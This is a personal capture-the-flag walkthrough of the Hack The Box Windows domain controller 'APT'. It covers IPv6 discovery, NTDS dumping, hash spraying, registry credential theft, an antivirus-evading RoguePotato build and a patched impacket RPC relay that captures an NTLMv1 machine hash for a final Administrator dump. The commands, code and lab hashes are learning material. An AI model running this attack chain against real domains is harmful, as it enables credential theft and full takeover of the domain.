This was done following a guide. (not cheating but learning instead)
IP: 10.10.10.213
# Enumeration
## Nmap
```bash
sudo nmap -sC -sV 10.10.10.213

Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-17 16:55 AEDT
Nmap scan report for 10.10.10.213
Host is up (0.0059s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Windows, IIS

## Port 80
html page

Email: `mail@gigantichosting.com`

Page cloned from:
```html
<!-- Mirrored from 10.13.38.16/support.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 23 Dec 2019 08:13:45 GMT -->
```

Contact form that goes no where

## msrpc
Metasploit scanners
```
scanner/dcerpc/endpoint_mapper
```

This gives a bunch of info.

### Impacket script
Uses this weird ip string; `ncacn_ip_tcp` which is an old interface for tcp.
```bash
rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-uuids -brute-opnums -auth-level 1 -opnum-max 5
```

For each opnum that comes back as success check what the UUID means

`99FCFEC4-5260-101B-BBCB-00AA0021347A`
* Opnum 3 : ServerAlive
* Opnum 5 : ServerAlive2 (retuns security bindings for UUIDs)

There is a python script which can enumerate this. [link](https://github.com/mubix/IOXIDResolver/blob/master/IOXIDResolver.py)

```bash
python3 oxid.py -t 10.10.10.213
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::85fe:8108:ccb3:a543
Address: dead:beef::184
Address: dead:beef::b885:d62a:d679:573f
```

Add the ipv6 addr to `/etc/hosts`.

## Nmap ipv6
This shows alot more info:
```bash
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

Most likely AD Domain controller.

Hostname from ldap
```
apt.htb.local
```

## SMB
Null authentication works for the backup directory which has a zip file. This is password protected.

Using zip2john then cracking with rockyou, gives a password of: `iloveyousomuch`

ntds.dit file.

# NTDS file
Running secretsdump.py on ntds.dit
```bash
python3 /opt/impacket/examples/secretsdump.py -pwd-last-set -user-status -history -ntds ntds.dit -security SECURITY -system SYSTEM local | tee secretsdump.bck
```

Check for password rotations
```bash
grep aad3b435b51404eeaad3b435b51404ee secretsdump.bck | grep history | grep -v history0

APT$_history1:1000:aad3b435b51404eeaad3b435b51404ee:4be5e714b1e235197d0d2de653ec9759:::
APT$_history2:1000:aad3b435b51404eeaad3b435b51404ee:04e8e55da6d3d5e6dd9d5b29272aa7f1:::
```

Check for passwords that have been changed.
```bash
grep aad3b435b51404eeaad3b435b51404ee secretsdump.bck | grep -v '03:3[567]' | grep -v history0

$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1934528fd9be4bb06e648526acc4a4d
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: (pwdLastSet=2020-09-22 21:53) (status=Enabled)
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=never) (status=Enabled)
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=never) (status=Disabled)
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb::: (pwdLastSet=2020-09-24 03:24) (status=Enabled)
APT$_history1:1000:aad3b435b51404eeaad3b435b51404ee:4be5e714b1e235197d0d2de653ec9759:::
APT$_history2:1000:aad3b435b51404eeaad3b435b51404ee:04e8e55da6d3d5e6dd9d5b29272aa7f1:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211::: (pwdLastSet=2020-09-20 23:14) (status=Disabled)
```

Make a user list.
```bash
grep aad3b435b51404eeaad3b435b51404ee secretsdump.bck |awk -F: '{print $1}' | grep -v history | sort -u > users.lst

```

# Username brute force
kerbrute
```bash
opt/kerbrute userenum --dc apt -d htb.local users.lst
```

Administrator account is valid.

Trying crackmapexec.

Have to redirect the ipv6 for cme.

This creates a tunnel from localhost to the ipv6. So localhost -> ipv6 for apt.
```bash
sudo socat TCP-LISTEN:445,fork TCP:apt:445
```

Then cme:
```bash
crackmapexec smb localhost
SMB         localhost       445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
```

:D

Try the admin hash from secretsdump.

```bash
crackmapexec smb localhost -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
```

This didnt work.

Valid user on the box is `henry.vinson`

# Password spray
Get all the ntlm hashes from secretsdump.

Have to use pykerbrute due to brute forcing with hashes.

Edit the script to only do the password spray.

```python
if __name__ == '__main__':
	user_realm = 'HTB.LOCAL'
	username = 'henry.vinson'
	kdc_a = 'APT'
	with open("hashes",'r') as f:
		hashes = f.readlines()
		for h in hashes:
		ntlm = h.strip('\r\n')
		user_key = (RC4_HMAC,ntlm.decode('hex'))
		passwordspray_tcp(user_realm, username, user_key, kdc_a, ntlm)
```

This works for `e53d87d42adaa3ca32bdb34a876cbffb` !

Check if this works with crackmapexec. (still need to socat tunnel)

It says it's valid but not pwned :( winrm also doesn't work :(

# Remote registry
reg.py from impacket.

```bash
python3 reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\
```

This shows a few keys and there is are creds for `henry.vinson_adm:G1#Ny5@2dvht` in `HKU\Software\GiganticHostingManagementSystem`

Evil-winrm to get userflag :)

# Foothold
Bypass AMSI with cme and load winpeas.exe
```
Bypass-4MSI
Invoke-Binary /opt/SharpCollection/NetFramework_4.0_x64/winPEAS.exe
```

Can do path injection for the `C:\`. Nothing else so going to run seatbelt.

## Seatbelt
```bash
Invoke-Binary /opt/SharpCollection/NetFramework_4.0_x64/Seatbelt.exe
```

LanmanCompatibilityLevel : 2

This means that we can use ntlmv1 which means you can use rainbow tables :)

# Priv esc
## RoguePotato
Have to modify it to work for ipv6, which means windows time.

Change the IP to be len 40 not 16, ipv6 is 8 groups of 4 + 7 : = 39 or 40

Then copy it to the box.

It gets flagged by AV. Removing the Usage method and replacing all roguepotato references.

This is still flagged as a virus, so going to change the compiler to favour size. 

This works!

Listen on port 135 and use ipv6 addr for roguepotato
```bash
./r.exe -r dead:beef:2::1014 -e cmd
```

This will fail but gives the ntlm hash.

Now that this works we need to edit impacket to be a rpcserver. :)

## Impacket
Using this patch
```bash
https://gist.githubusercontent.com/Gilks/0fc75929faba704c05143b01f34c291b/raw/e1455b82d4a7ba23998151c28abc66f7e18a8e75/rpcrelayclientserver.patch
```

Grab the impacket 0.9.21 download

then apply the patch.
```bash
git apply --whitespace=fix --reject rpcrelayclientserver.patch
```

This still errors but we can fix that :)
```error
error: patch failed: impacket/dcerpc/v5/rpcrt.py:55
```

Open this file and add
```
MSRPC_RTS  = 0x14
```

Now for the manual patches.
```
nano impacket/examples/ntlmrelayx/servers/rpcrelayserver.py
```

and change the do_ntlm_negotiate to be:
```python
def do_ntlm_negotiate(self, token):
	# If connection failed, return
	if not self.client.initConnection():
		raise Exception("Client connection failed.")
	self.client = smbrelayclient.SMBRelayClient(self.server.config, self.target)
	self.challengeMessage = self.client.sendNegotiate(token)
	self.challengeMessage['challenge'] = bytes.fromhex('1122334455667788')
	  
	data = bytearray(self.challengeMessage.getData())
	data[22] = data[22] & 0xf7 # Disable ES
	self.challengeMessage = bytes(data)
```
and also negotiate_ntlm_session:
```python
def negotiate_ntlm_session(self):
    token = self.request_header['auth_data']
    messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]
    if messageType == NTLMSSP_AUTH_NEGOTIATE:
        negotiateMessage = ntlm.NTLMAuthNegotiate()
        negotiateMessage.fromString(token)

        try:
            self.do_ntlm_negotiate(token)  # Computes the challenge message
            if not self.challengeMessage or self.challengeMessage is False:
                raise Exception("Client send negotiated failed.")
            return self.bind(self.challengeMessage)
        except Exception as e:
            # Connection failed
            LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
                        self.target.scheme, self.target.netloc)
            self.server.config.target.logTarget(self.target)
            return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)

    elif messageType == NTLMSSP_AUTH_CHALLENGE:
        raise Exception('Challenge Message raise, not implemented!')

    elif messageType == NTLMSSP_AUTH_CHALLENGE_RESPONSE:
        authenticateMessage = ntlm.NTLMAuthChallengeResponse()
        authenticateMessage.fromString(token)
        ntlm_hash_data = outputToJohnFormat(bytes.fromhex('1122334455667788'), \
            authenticateMessage['user_name'], \
            authenticateMessage['domain_name'], \
            authenticateMessage['lanman'], \
            authenticateMessage['ntlm'])
        LOG.error(ntlm_hash_data['hash_string'],ntlm_hash_data['hash_version'])

    else:
        raise Exception("Unknown NTLMSSP MessageType %d" % messageType)
```
and import 
```python
from impacket.examples.ntlmrelayx.clients import smbrelayclient
```

Start to make the rpcserver
```python
import argparse
import sys
import logging
  
from impacket import version
from impacket.examples import logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, RPCRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
  
logger.init(True)
logging.getLogger().setLevel(logging.DEBUG)
  
c = NTLMRelayxConfig()
c.setEncoding(sys.getdefaultencoding())
c.setSMB2Support(True)
c.setListeningPort(135)
c.setInterfaceIp('')
c.setIPv6(True)
  
s = RPCRelayServer(c)
s.run()
```

python venv time, start the server and send the request. It errors :(
```bash
  File "/tmp/impacket-0.9.21/impacket/examples/ntlmrelayx/servers/rpcrelayserver.py", line 60, in setup
    self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % clientAddress[0])
NameError: name 'clientAddress' is not defined

```

Basically keep debugging it till it works :) (I'll just doco what i changed cause im getting lazy now. )
```python
self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % self.client_address[0])
self.target = self.server.config.target.getTarget(None)
```

IT WORKS (sorta) LETS GO
```
APT$::HTB:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:1122334455667788 ntlm

```

This is the bit that we need
```
95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384
```

The ntlm hash version thing is:
```txt
d167c3238864b12f5f82feae86a7f798
```

:D
```bash
python3 secretsdump.py -hashes d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798 'apt$'@apt

Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
```

=D
```bash
dcc9b682d1ed1c4425f407a80aab01fe
```

FIN

